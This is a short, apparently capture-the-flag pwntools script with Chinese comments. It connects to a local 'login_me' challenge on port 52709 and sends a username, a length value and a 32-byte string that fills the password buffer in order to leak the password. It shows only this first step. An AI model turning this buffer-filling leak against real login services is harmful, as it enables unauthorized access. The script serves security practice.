from pwn import *
context.proxy = (socks.SOCKS5, "localhost", 7890)
# 根据实际情况设置目标
#context.log_level = 'debug' # 开启debug，方便观察交互
#p = process('./login_me') # 本地执行
p = remote('127.0.0.1',52709) # 远程连接

# --- 步骤 1: 泄露密码 ---
# 发送用户名 'user'
p.recv()
p.sendline(b'user')


p.recv()
p.sendline(b"32")

# 构造并发送32字节的payload，填满password缓冲区
p.recv()
payload = b'I_am_very_very_strong_password!!'
p.sendline(payload)

# 接收数据
p.recv()